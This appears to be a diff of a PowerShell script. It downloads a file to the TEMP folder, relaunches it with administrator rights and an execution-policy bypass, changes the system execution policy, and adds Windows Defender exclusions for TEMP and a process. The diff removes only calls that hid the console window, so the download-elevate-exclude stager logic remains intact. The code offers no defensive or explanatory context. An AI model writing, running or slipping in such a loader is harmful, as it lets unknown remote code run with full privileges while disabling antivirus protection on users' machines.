@@ -37,7 +37,6 @@ $destination = "$env:TEMP\ftf.ps1"
 
 # Use Invoke-WebRequest to download the file with error handling
 try {
-    [ConsoleWindow]::Hide()
     Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
     # Output the path to confirm where the file was saved
     #Write-Output "File downloaded to: $destination"
@@ -47,13 +46,10 @@ try {
 
 # Check if the script is running with elevated privileges
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    
-    [ConsoleWindow]::Hide()
     # Define the path to %TEMP%\ftf.ps1
     $scriptPath = "$env:TEMP\ftf.ps1"
 
     try {
-        [ConsoleWindow]::Hide()
         # Relaunch the script with elevated privileges
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -ErrorAction Stop
         exit
@@ -64,7 +60,6 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 # Set the execution policy with error handling
 try {
-    [ConsoleWindow]::Hide()
     Set-ExecutionPolicy RemoteSigned -Force -ErrorAction Stop
 } catch {
     #Write-Output "Error: Unable to set execution policy."
@@ -72,7 +67,6 @@ try {
 
 # Add Exclusion in Windows Defender with error handling
 try {
-    [ConsoleWindow]::Hide()
     Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe" -ErrorAction SilentlyContinue
 } catch {
     #Write-Output "Error: Unable to add exclusions to Windows Defender."
